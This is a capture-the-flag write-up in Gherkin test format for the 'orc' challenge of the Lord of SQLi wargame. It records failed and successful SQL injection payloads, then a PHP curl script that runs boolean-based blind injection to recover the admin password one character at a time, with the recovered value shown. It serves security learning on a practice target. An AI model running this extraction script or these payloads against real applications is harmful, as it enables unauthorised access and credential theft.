## Version 2.0
## language: en

Feature: orc-sql-injection-lordofsqli
  Site:
    https://los.rubiya.kr/gate.php
  Category:
    SQL Injection
  User:
    210
  Goal:
    Get admin password

  Background:
  Hacker's software:
    | <Software name> |    <Version>     |
    | Windows         | 10.0.1809 (x64)  |
    | Chrome          | 75.0.3770.142    |
    | PHP             | 7.3.9            |
  Machine information:
    Given the challenge URL
    """
    https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php
    """
    When I open the url with Chrome
    Then I see the PHP code that validates the password
    And It shows the query made on the screen
    """
    select id from prob_orc where id='admin' and pw=''
    """

  Scenario: Fail:Sql-injection
    Given the PHP code
    And knowing that answer is correct when It returns:
    """
    "<h2>Hello admin</h2>";
    """
    When I try with the well known payload:
    """
    pw=' OR 1 = 1
    """
    Then I don't get any response
    When I try with this one:
    """
    pw=' OR 1 = '1
    """
    Then I get "Hello admin"
    Then I go to check if the challenge is solved
    But I don't solve it

   Scenario: Success:Sqli-boolean-exploitation-technique
    Given I inspect the code one more time
    And I see that It is a must enter the exactly password
    """
    if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc");
    """
    When I search for another techniques
    Then I find "Boolean Exploitation Technique":
    """
    https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)
    #Boolean_Exploitation_Technique
    """
    And It consists of making boolean queries against the server
    And observing the answers and finally deducing the meaning of such answers
    When I try to get the password length with PHP:
    """
    2  $url = "https://los.rubiya.kr/chall/
    3  orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=";
    4  $ch = curl_init();
    5  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    6  curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie:
    7  PHPSESSID=273eb2fllib6pp1v8t32ac6odg"));
    8  $len = 0;
    9  $pos = false;
    10 while (!$pos) {
    11   $len++;
    12   $payload = urlencode("' or length(pw)=$len -- ;");
    13   curl_setopt($ch, CURLOPT_URL, $url.$payload);
    14   $data  = curl_exec($ch);
    15   $pos = strpos($data, 'Hello admin');
    16 }
    """
    Then I get the length of "8"
    And I could extract the password character by character
    When I try to guess every password character with this code:
    """
    17 $result = "";
    18 for ($i = 1; $i < $len+1; $i++) {
    19   foreach(array_merge(range('0','9'),range('a','z')) as $v) {
    20     $temp = $result.$v;
    21     $payload = urlencode("' or id='admin' and substr(pw,1,$i)='$temp' --
    22      ;");
    23     curl_setopt($ch, CURLOPT_URL, $url.$payload);
    24     $data  = curl_exec($ch);
    25     if(strpos($data, 'Hello admin')) {
    26       $result = $result.$v.'';
    27       break;
    28     }
    29   }
    30 }
    """
    Then I get the result "095a9852"
    Then I send the password
    And I solve the challenge
